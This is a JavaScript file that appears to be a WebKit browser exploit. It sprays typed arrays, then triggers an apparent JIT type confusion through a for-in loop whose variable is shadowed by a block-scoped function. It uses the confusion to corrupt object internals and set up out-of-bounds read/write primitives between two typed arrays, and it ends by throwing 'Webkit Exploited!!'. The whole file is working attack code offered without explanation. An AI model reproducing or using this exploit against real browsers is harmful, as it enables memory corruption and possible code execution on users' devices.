var leaker_obj = {a: 0};
var leaker_arr = new Uint32Array(6);

var oob_slave = new Uint8Array(1024);
var oob_master = new Uint32Array(7);

var spray = [];

function spray_one()
{
    var x = new Uint32Array(1);
    x[spray.length+'spray'] = 123;
    spray.push(x);
}

for(var i = 0; i < 0x10000; i++)
    spray_one();
var target = {a: 2.1100820415101592e-303, b: false, c: true, d: 5678};
var target2 = {a: 2.1100820415101592e-303, b: false, c: true, e: 5678};

var impl_idx = 0;

function create_impl()
{
    var ans = {a: target};
    for(var i = 0; i < 32; i++)
        ans[(impl_idx++)+'x'] = {};
    return ans;
}

function trigger(x)
{
    if(impl.a != target)
    {
        while(1);
    }
    var o = {a: 1};
    for(var i in o)
    {
        {
            i = x;
            function i(){}
        }
        o[i];
    }
	if(impl.a != target)
    {
        target.c = leaker_obj;
        leaker_obj.a = leaker_obj;
        var l1 = impl.a[4];
        var l2 = impl.a[5];
        leaker_obj.a = oob_slave;
        var s1 = impl.a[4];
        var s2 = impl.a[5];
        target.c = leaker_arr;
        impl.a[4] = l1;
        impl.a[5] = l2;
        target.c = oob_master;
        impl.a[4] = s1;
        impl.a[5] = s2;
        impl.a = target;
		throw "Webkit Exploited!!";
    }
}